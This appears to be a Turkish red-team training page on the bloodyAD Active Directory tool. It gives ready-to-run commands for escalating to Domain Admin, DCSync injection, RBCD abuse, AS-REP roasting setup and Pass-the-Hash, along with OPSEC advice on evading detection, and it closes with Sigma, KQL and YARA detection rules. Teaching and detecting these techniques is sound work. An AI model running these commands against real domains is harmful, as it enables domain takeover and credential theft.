# bloodyAD

> **Kategori:** [9. ACL, GPO ve Nesne Manipülasyonu](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Sylvain Heiniger (@CravateRouge) tarafından geliştirilen; Active Directory ortamlarında nesne erişim izinleri (DACL), sahiplik (Owner), grup üyelikleri, parola sıfırlama, Shadow Credentials, Resource-Based Constrained Delegation (RBCD), LAPS şifre okuma ve UAC bayrakları dahil tüm nesne manipülasyonlarını doğrudan saf LDAP/LDAPS protokolü üzerinden gerçekleştiren gelişmiş Python sömürü motoru.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında kullanıcılar, bilgisayarlar, gruplar ve GPO'lar gibi dizin nesnelerinin güvenliği Erişim Denetim Listeleri (ACL - Access Control Lists) ile yönetilir. Sızma testlerinde BloodHound gibi grafik analiz araçları etki alanındaki gizli yetki eskalasyon yollarını (`GenericAll`, `WriteDacl`, `WriteOwner`, `ForceChangePassword`, `AddMember`, `GenericWrite`) mükemmel şekilde tespit eder. Ancak BloodHound yalnızca bir haritalama aracıdır; bu izinlerin operasyonel olarak nasıl sömürüleceği kırmızı takım operatörünün sorumluluğundadır.

Tarihsel olarak operatörler; grup eklemek için `net group`, parola sıfırlamak için `Set-DomainUserPassword`, nesne sahipliği değiştirmek için `PowerView / Add-DomainObjectAcl` veya RBCD delegasyonu için `impacket-rbcd` gibi onlarca farklı aracı ve protokolü (SAMR, RPC, SMB, LDAP) ayrı ayrı kullanmak zorundaydı. Bu dağınıklık hem operasyonel hatalara yol açmakta hem de uç nokta EDR'ları ve RPC filtreleri tarafından yüksek oranda tespit edilmekteydi.

**`bloodyAD`**, tüm bu nesne manipülasyonu operasyonlarını tek bir çatı altında birleştiren, saf Python ve LDAP/LDAPS protokolü (`ldap3` kütüphanesi) tabanlı modern bir sömürü motorudur. Herhangi bir Windows ikilisine veya RPC servisine ihtiyaç duymadan, doğrudan etki alanı denetleyicisinin 389 (LDAP) veya 636 (LDAPS) portuna bağlanarak dizin veritabanını (`NTDS.dit`) uzaktan manipüle eder.

### Temel Yetenekleri ve Modüler Mimarisi

`bloodyAD`, nesneler üzerindeki operasyonları mantıksal alt modüllere ayırmıştır:
1. **Üyelik ve İzin Yönetimi (`add` / `remove`):**
   - `groupMember`: Hedef kullanıcıyı veya bilgisayarı `Domain Admins`, `Enterprise Admins` veya yerel yönetici gruplarına ekler ve çıkartır.
   - `genericAll`: Hedef nesne üzerinde belirtilen kullanıcıya tam denetim (`Full Control`) yetkisi tanımlar.
   - `dcsync`: Belirtilen hesaba etki alanı kök nesnesi (`DC=corp,DC=local`) üzerinde DCSync haklarını (`DS-Replication-Get-Changes` ve `DS-Replication-Get-Changes-All`) tanımlar.
2. **Kimlik ve Güvenlik Değişiklikleri (`set`):**
   - `password`: `ForceChangePassword` veya `GenericAll` izniyle hedef kullanıcının parolasını anında sıfırlar.
   - `owner`: Nesnenin `nTSecurityDescriptor` alanındaki `OwnerSID` değerini saldırganın kontrolündeki hesaba atar (`WriteOwner` sömürüsü).
   - `rbcd`: Hedef bilgisayarın `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğine sahte bilgisayar hesabını ekleyerek Resource-Based Constrained Delegation yetkisi verir.
   - `userAccountControl`: Hedef hesap üzerinde `DONT_REQ_PREAUTH` (AS-REP Roasting için) veya `TRUSTED_FOR_DELEGATION` bayraklarını açıp kapatır.
3. **Veri ve Şifre Hasadı (`get`):**
   - `writable`: Dizin içinde mevcut kullanıcının yazma hakkına sahip olduğu tüm nesneleri ve öznitelikleri dinamik olarak listeler.
   - `children`: Belirtilen OU konteyneri altındaki tüm nesneleri döker.
   - `dnsDump`: Microsoft Active Directory Integrated DNS (ADIDNS) kayıtlarını tamamen çeker.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                   SALDIRGAN LINUX PLATFORMU (BLOODYAD)                 │
│                                                                        │
│  [ bloodyAD --host 10.10.10.1 -d corp.local -u jdoe -p Pass123 -s ]    │
│         │                                                              │
│         ├── (1) LDAPS TLS Bağlantısı Kurulur (TCP 636)                 │
│         │   └── Kimlik Doğrulama: NTLM, Parola veya Kerberos (-k)      │
│         │                                                              │
│         ├── (2) BloodHound Yolunun Sömürülmesi:                        │
│         │       ├─ set owner target_da jdoe (WriteOwner)               │
│         │       ├─ add genericAll target_da jdoe (WriteDacl)           │
│         │       ├─ add dcsync jdoe (DCSync ACE Injection)              │
│         │       └─ add groupMember "Domain Admins" jdoe                │
│         │                                                              │
│         ▼                                                              │
│  [ ETKİ ALANI DENETLEYİCİSİ (NTDS.DIT / DIRECTORY SYSTEM AGENT) ]      │
│         │                                                              │
│         ├── LDAP Modify / ModifyDN Operasyonunu Doğrular               │
│         ├── nTSecurityDescriptor ve member Özniteliklerini Günceller   │
│         │                                                              │
│         ▼                                                              │
│  [ Dizin Güncellendi! Saldırgan Domain Admin Yetkisine Yükseldi ]      │
│         │                                                              │
│         └── (3) Operasyon Sonrası İz Temizliği (Rollback):             │
│                 bloodyAD ... remove groupMember "Domain Admins" jdoe   │
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Kriter | Geleneksel Araçlar (PowerView / net.exe) | bloodyAD Yaklaşımı |
|---|---|---|
| **Kullanılan Protokoller** | SAMR, RPC, SMB, LDAP karışık kullanılır; çok fazla port açar. | **Yalnızca LDAP / LDAPS (TCP 389/636)**. Başka hiçbir porta dokunmaz. |
| **Uç Nokta EDR Radarı** | Windows komut isteminde `net group` çalıştırmak anında alarm üretir. | Uç noktaya hiç uğramaz; doğrudan Linux'tan DC veritabanını günceller. |
| **Pass-the-Hash Desteği** | Windows yerel araçları NTLM hash ile çalışamaz. | `--hashes :NT_HASH` ile Pass-the-Hash LDAP kimlik doğrulaması yapar. |
| **Geri Alabilirlik (Rollback)** | Eklenen yetkileri ve delegasyonları temizlemek zordur. | Her `add` komutunun birebir karşılığı olan `remove` komutu bulunur. |

### Alternatif Araçlarla Karşılaştırma

| Özellik | bloodyAD | StandIn | PowerView | aclpwn.py |
|---|---|---|---|---|
| **Geliştirme Dili** | Python 3 | C# (.NET) | PowerShell | Python 2/3 |
| **Çalışma Platformu** | Linux / macOS / Windows | Windows Yerel | Windows Yerel | Linux / Windows |
| **Protokol** | Saf LDAP / LDAPS | LDAP / Win32 API | LDAP / ADSI | Neo4j + Impacket |
| **DCSync İzni Enjeksiyonu** | 🟢 Yerleşik (`add dcsync`) | 🟢 Yerleşik | 🟢 `Add-DomainObjectAcl` | 🟢 Otomatik |
| **RBCD Delegasyon Enjeksiyonu** | 🟢 Yerleşik (`add rbcd`) | 🟢 Yerleşik | 🟡 Manuel Raw Hex | 🟢 Otomatik |
| **İz Temizliği (Rollback)** | 🟢 Tam Destekli (`remove`) | 🟡 Kısmi | 🔴 Manuel komut gerekir | 🔴 Temizlik yapmaz |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

bloodyAD, genel bağlantı parametreleri ve ardından gelen hiyerarşik modül eylemleri (`add`, `remove`, `set`, `get`) şeklinde yapılandırılmıştır.

### Genel Sözdizimi

```bash
bloodyAD --host <DC_IP_VEYA_FQDN> -d <DOMAIN> -u <KULLANICI> [Kimlik Seçenekleri] <Komut> <Modül> [Parametreler]
```

### Genel Bağlantı Parametreleri

| Parametre / Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|
| `--host FQDN_IP` | Hedef Etki Alanı Denetleyicisinin FQDN veya IP adresi (Zorunlu). | `--host 10.10.10.1` |
| `-d`, `--domain` | Hedef Active Directory etki alanı adı. | `-d corp.local` |
| `-u`, `--user` | Kimlik doğrulamada kullanılacak kullanıcı hesabı. | `-u jdoe` |
| `-p`, `--password` | Kullanıcı parolası. | `-p 'Welcome2026!'` |
| `--hashes LM:NT` | Parola yerine NTLM karması ile Pass-the-Hash kimlik doğrulaması. | `--hashes :31d6cfe0d16ae931b73c59d7e0c089c0` |
| `-k`, `--kerberos` | Parola/Hash yerine mevcut Kerberos biletini (`KRB5CCNAME`) kullanır. | `-k` |
| `-s`, `--secure` | Bağlantıyı SSL/TLS (LDAPS Port 636) üzerinden şifreler (Şiddetle önerilir). | `-s` |
| `-c`, `--certificate` | Schannel LDAPS kimlik doğrulaması için kullanılacak PFX/PEM sertifikası. | `-c user.pfx` |
| `-v`, `--verbose` | Ayrıntılı hata ayıklama ve LDAP ASN.1 paket loglarını basar. | `-v` |

### Başlıca Modül Komutları

| Komut ve Modül | Açıklama |
|---|---|
| `add groupMember <Grup> <Üye>` | Hedef kullanıcıyı veya nesneyi belirtilen güvenlik grubuna ekler. |
| `remove groupMember <Grup> <Üye>` | Kullanıcıyı belirtilen güvenlik grubundan çıkarır (Temizlik). |
| `set password <Hedef> <YeniParola>` | Hedef kullanıcının parolasını belirtilen yeni parola ile sıfırlar. |
| `set owner <Hedef> <YeniSahip>` | Hedef nesnenin sahipliğini (`OwnerSID`) değiştirir. |
| `add genericAll <Hedef> <Principal>` | Hedef nesne üzerinde belirtilen hesaba `GenericAll` tam denetim izni verir. |
| `add dcsync <HedefKullanıcı>` | Etki alanı kökünde hedef kullanıcıya DCSync haklarını tanımlar. |
| `add rbcd <HedefBilgisayar> <SahteMakine>` | Hedef bilgisayara Resource-Based Constrained Delegation izni tanımlar. |
| `set userAccountControl <Hedef> -f BAYRAK` | UAC bit bayraklarını manipüle eder (`DONT_REQ_PREAUTH` vb.). |
| `get writable <Konteyner>` | Belirtilen konteyner altında kullanıcının yazma hakkı olan nesneleri listeler. |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Grup Üyeliği Ekleme (Domain Admins Sömürüsü)

BloodHound üzerinde bir kullanıcının `Domain Admins` veya `Enterprise Admins` grubu üzerinde `AddMember` veya `GenericAll` hakkına sahip olduğu görüldüğünde:

```bash
bloodyAD --host dc01.corp.local -d corp.local -u jdoe -p 'Welcome2026!' -s add groupMember 'Domain Admins' jdoe
```

**Örnek Konsol Çıktısı Analizi:**

```text
[+] Connecting to LDAPS server: dc01.corp.local:636
[+] Authenticated as: jdoe@corp.local
[*] Resolving target group: CN=Domain Admins,CN=Users,DC=corp,DC=local
[*] Resolving target member: CN=jdoe,OU=Users,DC=corp,DC=local
[*] Sending LDAP modify request: ADD member = CN=jdoe,OU=Users,DC=corp,DC=local
[+] Successfully added 'jdoe' to group 'Domain Admins'!
```

*Çıktı Yorumu:* `jdoe` kullanıcısı artık etki alanındaki en yetkili grubun tam üyesidir. Operasyon sonrasında bu işlem `remove groupMember` ile kolayca geri alınabilir.

### Senaryo 2: Parola Sıfırlama (ForceChangePassword Sömürüsü)

Hedef bir yönetici hesabı üzerinde `ForceChangePassword` veya `ResetPassword` genişletilmiş hakkı bulunduğunda:

```bash
bloodyAD --host dc01.corp.local -d corp.local -u jdoe -p 'Welcome2026!' -s set password da_admin 'ComplexPwnedPass#2026!'
```

Bu işlem sonucunda `da_admin` kullanıcısının parolası LDAP üzerinden anında güncellenir ve yeni parola ile oturum açılabilir.

### Senaryo 3: Zincirleme Sahiplik Ele Geçirme ve GenericAll Tanımlama (WriteOwner -> WriteDacl)

Kullanıcının hedef hesap üzerinde yalnızca `WriteOwner` hakkı olduğunda:
1. **Adım 1:** Nesnenin sahipliği saldırgan hesabına atanır:
   ```bash
   bloodyAD --host dc01.corp.local -d corp.local -u jdoe -p 'Welcome2026!' -s set owner target_admin jdoe
   ```
2. **Adım 2:** Sahip (Owner) olunduğu için nesne DACL'ine tam yetki (`GenericAll`) enjekte edilir:
   ```bash
   bloodyAD --host dc01.corp.local -d corp.local -u jdoe -p 'Welcome2026!' -s add genericAll target_admin jdoe
   ```
3. **Adım 3:** Artık tam yetki elde edildiğinden parola istenildiği gibi sıfırlanabilir.

### Senaryo 4: Hedef Kullanıcıya Doğrudan DCSync Yetkisi Enjekte Etme

Eğer kullanıcının etki alanı kök nesnesi (`DC=corp,DC=local`) üzerinde `WriteDacl` yetkisi varsa, doğrudan DCSync hakları tanımlanabilir:

```bash
bloodyAD --host dc01.corp.local -d corp.local -u jdoe -p 'Welcome2026!' -s add dcsync jdoe
```

Bu komuttan hemen sonra `impacket-secretsdump` çalıştırıldığında `jdoe` kullanıcısı tüm etki alanı NTLM hash'lerini başarıyla dökebilir.

### Senaryo 5: Resource-Based Constrained Delegation (RBCD) Enjeksiyonu

Hedef sunucu (`EXCHANGE01$`) üzerinde `GenericWrite` yetkisi olduğunda, kontrol altındaki sahte bir bilgisayar hesabı (`ATTACKPC$`) delegasyon listesine eklenir:

```bash
bloodyAD --host dc01.corp.local -d corp.local -u jdoe -p 'Welcome2026!' -s add rbcd EXCHANGE01$ ATTACKPC$
```

Ardından `getST.py` ile `ATTACKPC$` kimliği üzerinden `Administrator` taklit edilerek Exchange sunucusu tam yetkiyle ele geçirilir.

### Senaryo 6: AS-REP Roasting İçin DONT_REQ_PREAUTH Bayrağını Açma

Parolasını doğrudan değiştirmek istemediğimiz bir servis hesabı üzerinde yazma hakkımız varsa:

```bash
bloodyAD --host dc01.corp.local -d corp.local -u jdoe -p 'Welcome2026!' -s set userAccountControl svc_sql -f DONT_REQ_PREAUTH
```

Bu bayrak açıldığı anda `impacket-GetNPUsers` ile hesabın AS-REP bileti parolasız indirilir ve çevrimdışı kırılmak üzere Hashcat'e aktarılır.

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `LDAPSocketOpenError: cServer SSL error / Connection refused on port 636` | `--host` parametresinde IP adresi kullanılmıştır ve DC'nin SSL sertifikasındaki isimle uyuşmamaktadır ya da LDAPS servisi kapalıdır. | `--host` parametresine IP yerine Domain Controller'ın tam FQDN adı (`dc01.corp.local`) verilmeli ve `/etc/hosts` dosyasına IP eşleştirmesi eklenmelidir. |
| `LDAPInsufficientAccessRightsResult: 0x32 (INSUFFICIENT_ACCESS_RIGHTS)` | Kimlik doğrulayan kullanıcının hedef nesne veya öznitelik üzerinde gerekli erişim hakkı (ACE) bulunmamaktadır. | BloodHound üzerindeki ilişki tekrar doğrulanmalıdır. Örneğin `ForceChangePassword` hakkı yoksa `set password` çalışmaz; önce `set owner` veya `add genericAll` zinciri denenmelidir. |
| `WILL_NOT_PERFORM (0x35) / PASSWORD_RESTRICTION` | `set password` ile atanan yeni parola, etki alanının minimum uzunluk, karmaşıklık veya parola geçmişi (Password History) ilkelerini karşılamamaktadır. | Çok daha uzun (16+ karakter), büyük-küçük harf, rakam ve özel karakter içeren kurumsal parola kalıplarına uygun bir şifre denenmelidir. |
| `LDAPStrongAuthRequiredResult: 0x08` | Domain Controller üzerinde LDAP İmzalama (Signing) veya Kanal Bağlama (Channel Binding) zorunludur; düz metin (Port 389) bağlantılar reddedilmektedir. | Komuta mutlaka `-s` / `--secure` bayrağı eklenerek bağlantı TLS şifreli LDAPS (Port 636) üzerinden gerçekleştirilmelidir. |
| `CONSTRAINT_VIOLATION (0x13) on AdminCount=1 objects` | Hedef hesap korumalı bir gruptadır (`AdminSDHolder` tarafından korunmaktadır) ve miras alınan (inherited) ACE'ler kısıtlanmıştır. | Hedef hesap doğrudan etki alanı yöneticisi ise parola sıfırlama veya ACL ekleme başarısız olabilir; `AdminSDHolder` nesnesi hedeflenmeli veya korumasız hesaplar üzerinden eskalasyon yapılmalıdır. |
| `KerberosSessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN` | `-k` bayrağı ile Kerberos bileti kullanılırken DC adı veya etki alanı realm adı doğru çözümlenememiştir. | `KRB5CCNAME` ortam değişkeni doğrulanmalı; `/etc/krb5.conf` dosyasına kurumsal realm yapılandırması eklenmelidir. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ Ağ Portları ]     : 🟢 MİNİMAL (Yalnızca TCP 389 veya 636)         │
│  [ Uç Nokta İzi ]    : 🟢 SIFIR (İş istasyonlarında süreç çalışmaz)   │
│  [ Dizin Olayları ]  : 🔴 YÜKSEK (Event 5136, 4728, 4724 Logları)     │
│  [ SIEM Tespit ]     : 🟡 ORTA (LDAPS trafiği şifreli akar)           │
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler (Artifacts & Telemetry)

1. **Domain Controller Dizin Değişiklik Günlükleri (Security Log):**
   - **Event ID 5136 (Directory Service Object Modified):**
     - Nesne ACL değişikliklerinde: `AttributeLDAPDisplayName: nTSecurityDescriptor`
     - RBCD enjeksiyonunda: `AttributeLDAPDisplayName: msDS-AllowedToActOnBehalfOfOtherIdentity`
     - UAC bayraklarında: `AttributeLDAPDisplayName: userAccountControl`
   - **Event ID 4728 / 4732 / 4756:** Güvenlik etkin bir gruba (`Domain Admins` vb.) yeni bir üye eklendi.
   - **Event ID 4724:** Bir hesabın parolası sıfırlanmaya çalışıldı (Yapan hesap ve hedef hesap görünür).
   - **Event ID 4738:** Bir kullanıcı hesabı değiştirildi (UAC ve bayrak modifikasyonları).
2. **Ağ Telemetrisi:**
   - Dizin sunucusunun 636 portuna yapılan yoğun `modifyRequest` çağrıları. LDAPS kullanıldığında paket içeriği şifrelidir ancak oturum süresi ve paket boyutları ağ anomalisi olarak izlenebilir.

### 5.2 Ağ ve EDR İmzaları

- **Sıfır Uç Nokta Süreci:** Saldırı doğrudan ağ üzerinden yürütüldüğü için Windows uç noktalarında çalışan EDR yazılımları (Defender for Endpoint, CrowdStrike, SentinelOne) herhangi bir süreç veya bellek anomalisi tespit edemez.
- **Dizin Hizmeti Denetimi:** Tespit tamamen Domain Controller üzerindeki Gelişmiş Güvenlik Denetimi İlkeleri'ne (Advanced Audit Policies) dayanır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1098** | Account Manipulation | Nesne ACL'lerinin, UAC bayraklarının ve sahipliğin değiştirilmesi. |
| **T1098.001** | Additional Cloud/Domain Roles | Ayrıcalıklı gruplara (`Domain Admins`) kullanıcı eklenmesi. |
| **T1484.001** | Domain Policy Modification | RBCD ve delegasyon özniteliklerinin manipülasyonu. |
| **T1078.002** | Valid Accounts: Domain Accounts | Parolası sıfırlanan veya üye yapılan hesaplarla oturum açılması. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **Kalıcı Grup Üyeliği İzi** | İşlem tamamlandığında eklenen kullanıcı mutlaka `remove groupMember` ile gruptan çıkarılmalı; nesne kirli bırakılmamalıdır. |
| **Parola Sıfırlama Gürültüsü** | Mümkünse parola sıfırlamaktan (`set password`) kaçının; bunun yerine Shadow Credentials veya RBCD delegasyonu gibi parolasız teknikleri tercih edin. |
| **Düz Metin LDAP İzlenmesi** | Asla port 389 kullanmayın; her zaman `-s` bayrağı ile LDAPS (Port 636) kullanarak ağdaki NIDS/pcap kayıtlarından gizlenin. |
| **DCSync Yetkisi Temizliği** | `add dcsync` ile eklenen haklar operasyon bitiminde `remove dcsync` ile kaldırılmalıdır; aksi halde denetim raporlarında kalıcı bulgu oluşturur. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: Ayrıcalıklı Gruplara Beklenmedik Üye Eklenmesi Tespiti

```yaml
title: Privileged Domain Group Member Addition
id: f81249b1-4812-4c20-a912-38910245fe01
status: experimental
description: Detects the addition of members to privileged Active Directory groups such as Domain Admins.
author: Modul 11 Security Research
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID:
      - 4728 # Global Group Member Add
      - 4732 # Local Group Member Add
      - 4756 # Universal Group Member Add
    TargetUserName:
      - 'Domain Admins'
      - 'Enterprise Admins'
      - 'Administrators'
      - 'Schema Admins'
  condition: selection
falsepositives:
  - Authorized administrative promotions via Change Management tickets
level: critical
tags:
  - attack.persistence
  - attack.t1098.001
```

#### Microsoft Sentinel KQL Sorgusu: nTSecurityDescriptor Değişikliği ve Hemen Ardından Yapılan Grup Değişimi

```kql
// Kısa süre içinde nesne ACL'i değiştirilip (5136) ardından aynı hesap tarafından grup üyesi eklenmesi (4728)
let AclMod = SecurityEvent
| where TimeGenerated > ago(1h)
| where EventID == 5136
| extend EventDataXML = parse_xml(EventData)
| extend Attr = tostring(EventDataXML.EventData.Data[7])
| extend Subject = tostring(EventDataXML.EventData.Data[1])
| where Attr == "nTSecurityDescriptor"
| project AclTime = TimeGenerated, Subject, TargetObject = tostring(EventDataXML.EventData.Data[4]);
let GroupMod = SecurityEvent
| where TimeGenerated > ago(1h)
| where EventID in (4728, 4732, 4756)
| project GroupTime = TimeGenerated, SubjectUserName, TargetUserName, MemberName;
AclMod
| join kind=inner (GroupMod) on $left.Subject == $right.SubjectUserName
| where GroupTime between (AclTime .. (AclTime + 10m))
| project AclTime, GroupTime, Subject, TargetObject, TargetUserName, MemberName
```

#### YARA Kuralı: bloodyAD Python Modülü ve Komut İmzaları

```yara
rule PostExploit_bloodyAD_Framework {
    meta:
        description = "Detects bloodyAD Active Directory privilege escalation toolset and modules"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "bloodyAD" ascii
        $s2 = "add groupMember" ascii
        $s3 = "add genericAll" ascii
        $s4 = "add dcsync" ascii
        $s5 = "add rbcd" ascii
        $s6 = "msDS-AllowedToActOnBehalfOfOtherIdentity" ascii
    condition:
        all of ($s1, $s2) or (3 of ($s3, $s4, $s5, $s6))
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Kullanıcıyı Domain Admins Grubuna Ekleme
```bash
bloodyAD --host dc01.corp.local -d corp.local -u jdoe -p 'Pass123' -s add groupMember 'Domain Admins' jdoe
```
- **Ne Yapar?** `jdoe` kullanıcısını doğrudan en yetkili kurumsal grup olan `Domain Admins` üyesi yapar.
- **Ne Zaman Kullanılır?** Grup üzerinde `AddMember` veya `GenericAll` yetkisi elde edildiğinde.
- **Parametreler:** `--host`: DC FQDN'i, `-s`: LDAPS güvenli soket, `add groupMember`: Grup ekleme eylemi.

### Komut 2: Hedef Kullanıcının Parolasını Sıfırlama
```bash
bloodyAD --host dc01.corp.local -d corp.local -u jdoe -p 'Pass123' -s set password da_user 'ComplexPwn#2026!'
```
- **Ne Yapar?** Eski parolayı bilmeye gerek kalmaksızın hedef kullanıcının parolasını yeni değerle değiştirir.
- **Ne Zaman Kullanılır?** Kullanıcı nesnesi üzerinde `ForceChangePassword` hakkı bulunduğunda.
- **Parametreler:** `set password`: Parola sıfırlama eylemi.

### Komut 3: Nesne Sahipliğini Ele Geçirme (WriteOwner Sömürüsü)
```bash
bloodyAD --host dc01.corp.local -d corp.local -u jdoe -p 'Pass123' -s set owner target_object jdoe
```
- **Ne Yapar?** Hedef nesnenin `OwnerSID` değerini `jdoe` olarak değiştirir.
- **Ne Zaman Kullanılır?** Nesne üzerinde `WriteOwner` yetkisi olduğunda tam denetime giden ilk adım olarak.
- **Parametreler:** `set owner`: Sahiplik atama.

### Komut 4: Nesne Üzerinde Tam Denetim (GenericAll) Tanımlama
```bash
bloodyAD --host dc01.corp.local -d corp.local -u jdoe -p 'Pass123' -s add genericAll target_object jdoe
```
- **Ne Yapar?** Hedef nesnenin DACL listesine `jdoe` için `GenericAll` erişim denetim girdisi (ACE) ekler.
- **Ne Zaman Kullanılır?** Nesne üzerinde `WriteDacl` veya `Owner` hakkı olduğunda.
- **Parametreler:** `add genericAll`: Tam denetim ekleme.

### Komut 5: Hedef Kullanıcıya Doğrudan DCSync Yetkisi Verme
```bash
bloodyAD --host dc01.corp.local -d corp.local -u jdoe -p 'Pass123' -s add dcsync jdoe
```
- **Ne Yapar?** Etki alanı köküne `DS-Replication-Get-Changes` haklarını ekleyerek kullanıcıyı DCSync yapabilir kılar.
- **Ne Zaman Kullanılır?** Etki alanı nesnesi (`DC=corp,DC=local`) üzerinde `WriteDacl` yetkisi olduğunda.
- **Parametreler:** `add dcsync`: Replikasyon izinlerini tanımlar.

### Komut 6: Resource-Based Constrained Delegation (RBCD) Yapılandırma
```bash
bloodyAD --host dc01.corp.local -d corp.local -u jdoe -p 'Pass123' -s add rbcd SRV01$ ATTACKPC$
```
- **Ne Yapar?** `SRV01$` makinesinin `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğine `ATTACKPC$` makinesini yazar.
- **Ne Zaman Kullanılır?** Sunucu üzerinde `GenericWrite` yetkisiyle yönetici taklidi yapmak için.
- **Parametreler:** `add rbcd`: Delegasyon hakkı ekleme.

### Komut 7: Kullanıcının Yazma Hakkı Olan Nesneleri Tarama
```bash
bloodyAD --host dc01.corp.local -d corp.local -u jdoe -p 'Pass123' -s get writable 'OU=Servers,DC=corp,DC=local'
```
- **Ne Yapar?** Belirtilen OU altında mevcut kullanıcının değiştirebileceği tüm nesneleri ve izin türlerini döker.
- **Ne Zaman Kullanılır?** Yetki eskalasyonu için hedef belirleme aşamasında.
- **Parametreler:** `get writable`: Yazılabilir nesne keşfi.

### Komut 8: AS-REP Roasting İçin Ön Kimlik Doğrulamayı Kapatma
```bash
bloodyAD --host dc01.corp.local -d corp.local -u jdoe -p 'Pass123' -s set userAccountControl svc_acc -f DONT_REQ_PREAUTH
```
- **Ne Yapar?** Kullanıcı hesabında `DONT_REQ_PREAUTH` bayrağını açarak parolasız AS-REP çekilmesini sağlar.
- **Ne Zaman Kullanılır?** Parolayı sıfırlamadan çevrimdışı parola kırma saldırısı başlatmak için.
- **Parametreler:** `-f DONT_REQ_PREAUTH`: UAC bayrağı.

### Komut 9: Eklenen Grup Üyeliğini Güvenle Geri Alma (OPSEC Temizliği)
```bash
bloodyAD --host dc01.corp.local -d corp.local -u jdoe -p 'Pass123' -s remove groupMember 'Domain Admins' jdoe
```
- **Ne Yapar?** `jdoe` kullanıcısını `Domain Admins` grubundan çıkartarak nesneyi eski haline döndürür.
- **Ne Zaman Kullanılır?** Test tamamlandığında veya yetki yükseltme sonrası kalıcı iz bırakmamak için.
- **Parametreler:** `remove groupMember`: Grup üyeliğini kaldırma.

### Komut 10: Pass-the-Hash ile LDAPS Üzerinden Çalıştırma
```bash
bloodyAD --host dc01.corp.local -d corp.local -u admin --hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -s add groupMember 'Domain Admins' attacker
```
- **Ne Yapar?** Açık parola yerine NTLM hash'i kullanarak LDAP kimlik doğrulaması yapar ve grup ekler.
- **Ne Zaman Kullanılır?** Parolası bilinmeyen yalnızca hash'i bulunan yetkili hesaplarla işlem yaparken.
- **Parametreler:** `--hashes`: LM:NT parola karması formatı.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [CravateRouge / bloodyAD](https://github.com/CravateRouge/bloodyAD)
- **BloodyAD Dokümantasyonu:** [bloodyAD Readme & Wiki](https://cravaterouge.github.io/bloodyAD/)
- **SpecterOps ACL Araştırması:** [Active Directory Discretionary Access Control Lists (DACL)](https://posts.specterops.io/)
- **MITRE ATT&CK Referansı:** [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/)

---

> **Önceki:** [← CertStealer (Kategori 08)](../Kategori_08_Active_Directory_Sertifika_Servisleri/CertStealer.md) · **Sonraki:** [aclpwn →](./aclpwn.md)
